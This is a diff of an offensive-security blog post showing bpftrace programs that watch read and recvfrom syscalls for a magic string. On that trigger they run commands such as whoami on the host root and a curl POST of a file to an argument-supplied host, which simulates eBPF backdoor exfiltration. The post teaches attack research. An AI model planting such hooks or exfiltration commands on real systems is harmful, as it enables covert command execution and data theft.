@@ -151,7 +151,7 @@
 <p>How did I get there? Let&rsquo;s get started.</p>
 <h2 id="finding-trace-points-of-interest">Finding trace points of interest</h2>
 <p>Searching through hook points with <code>bpftrace -lv</code> identified useful seeming trace points:</p>
-<pre tabindex="0"><code>$ sudo bpftrace -lv 'tracepoint:*enter_read' 
+<pre tabindex="0"><code>$ sudo bpftrace -lv &#39;tracepoint:*enter_read&#39; 
 BTF: using data from /sys/kernel/btf/vmlinux
 tracepoint:syscalls:sys_enter_read
     int __syscall_nr;
@@ -184,14 +184,14 @@ tracepoint:syscalls:sys_enter_read
 / @sys_read[tid] /   
 { 
   $cmd = str(@sys_read[tid], args-&gt;ret);
-  printf(&quot;&lt;-sys_exit_read: $cmd);
+  printf(&#34;&lt;-sys_exit_read: $cmd);
 
-  if ($cmd == &quot;OhhhBPF!\n&quot;)
+  if ($cmd == &#34;OhhhBPF!\n&#34;)
   {   
-    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
+    system(&#34;whoami &gt;&gt; /proc/1/root/tmp/o&#34;);
   }
 
-  printf(&quot;&lt;-sys_exit_read(tdi:%d).\n&quot;, tid);
+  printf(&#34;&lt;-sys_exit_read(tdi:%d).\n&#34;, tid);
 }
 </code></pre><p>Now the <code>$cmd</code> contains the string. You can also use <code>buf(@sys_read[tid, args-&gt;ret)</code> to read the hex representation and to print hex with bpftrace&rsquo;s <code>printf</code> use the <code>\r</code> option.</p>
 <p>Finally, string comparison such as <code>if ($cmd == &quot;OhhhBPF!\n&quot;)</code> can be used to make decisions based on messages that arrive.</p>
@@ -212,7 +212,7 @@ tracepoint:syscalls:sys_enter_read
 
 BEGIN
 {
-  printf(&quot;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&quot;);
+  printf(&#34;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&#34;);
 }
 
 tracepoint:syscalls:sys_enter_accept*
@@ -229,7 +229,7 @@ tracepoint:syscalls:sys_exit_accept*
 tracepoint:syscalls:sys_enter_read
 / @sys_accepted[tid] /
 {   
-  printf(&quot;-&gt;sys_enter_read for allowed thread (fd: %d)\n&quot;, args-&gt;fd);
+  printf(&#34;-&gt;sys_enter_read for allowed thread (fd: %d)\n&#34;, args-&gt;fd);
   @sys_read[tid] = args-&gt;buf;
 }
 
@@ -239,7 +239,7 @@ tracepoint:syscalls:sys_exit_read
   { 
     $len = args-&gt;ret;
     $cmd = str(@sys_read[tid], $len);
-    printf(&quot;*** Command: %s\n&quot;, $cmd);
+    printf(&#34;*** Command: %s\n&#34;, $cmd);
   } 
 }
 
@@ -248,7 +248,7 @@ END
     clear(@sk);
     clear(@sys_read);
     clear(@sys_accepted);
-    printf(&quot;Exiting. Bye.\n&quot;);
+    printf(&#34;Exiting. Bye.\n&#34;);
 }
 </code></pre><p>After these changes the program works, and without noise.</p>
 <h2 id="system-command">Command parsing and simulating data exfiltration</h2>
@@ -260,19 +260,19 @@ END
 
   if ((@sys_read[tid] != 0) &amp;&amp; ($len &gt; 9))
   { 
-    //lot's of assumption, but should work for line based protocols
+    //lot&#39;s of assumption, but should work for line based protocols
     $cmd = str(@sys_read[tid], 9);
-    if ($cmd == &quot;OhhhBPF: &quot;)
+    if ($cmd == &#34;OhhhBPF: &#34;)
     {
       $cmd = str(@sys_read[tid]+9, $len-9-1);
-      printf(&quot;*** Command: %s\n&quot;, $cmd);
+      printf(&#34;*** Command: %s\n&#34;, $cmd);
 
-      if ($cmd == &quot;!exfil&quot;)
+      if ($cmd == &#34;!exfil&#34;)
       {   
-        printf(&quot;Command:exfil\n&quot;);
-        system(&quot;echo POC &gt; /proc/1/root/tmp/o&quot;);
-        system(&quot;curl -X POST --data-binary @/proc/1/root/tmp/o %s&quot;, str($1));
-        system(&quot;rm -f /proc/1/root/tmp/o&quot;);
+        printf(&#34;Command:exfil\n&#34;);
+        system(&#34;echo POC &gt; /proc/1/root/tmp/o&#34;);
+        system(&#34;curl -X POST --data-binary @/proc/1/root/tmp/o %s&#34;, str($1));
+        system(&#34;rm -f /proc/1/root/tmp/o&#34;);
       }
       else
       {
@@ -288,14 +288,14 @@ END
 <pre tabindex="0"><code>$ sudo strace -p 70501
 strace: Process 70501 attached
 epoll_wait(11, [{events=EPOLLIN, data={u32=3680256016, u64=139710376460304}}], 512, -1) = 1
-accept4(6, {sa_family=AF_INET, sin_port=htons(37194), sin_addr=inet_addr(&quot;10.0.0.2&quot;)}, [112-&gt;16], SOCK_NONBLOCK) = 8
+accept4(6, {sa_family=AF_INET, sin_port=htons(37194), sin_addr=inet_addr(&#34;10.0.0.2&#34;)}, [112-&gt;16], SOCK_NONBLOCK) = 8
 epoll_ctl(11, EPOLL_CTL_ADD, 8, {events=EPOLLIN|EPOLLRDHUP|EPOLLET, data={u32=3680256713, u64=139710376461001}}) = 0
 epoll_wait(11, GET[{events=EPOLLIN, data={u32=3680256713, u64=139710376461001}}], 512, 60000) = 1
-recvfrom(8, &quot;GET / HTTP/1.0\n&quot;, 1024, 0, NULL, NULL) = 15
+recvfrom(8, &#34;GET / HTTP/1.0\n&#34;, 1024, 0, NULL, NULL) = 15
 </code></pre><p>Turns out nginx uses <code>recvfrom</code>!</p>
 <p>So, the next step was to look for <code>recvfrom</code> trace points.</p>
 <p>To figure that out, I used our friend <code>bpftrace</code> again with the <code>-lv</code> options:</p>
-<pre tabindex="0"><code>$ sudo bpftrace -lv 'tracepoint:*recvfrom*'
+<pre tabindex="0"><code>$ sudo bpftrace -lv &#39;tracepoint:*recvfrom*&#39;
 BTF: using data from /sys/kernel/btf/vmlinux
 tracepoint:syscalls:sys_enter_recvfrom
     int __syscall_nr;
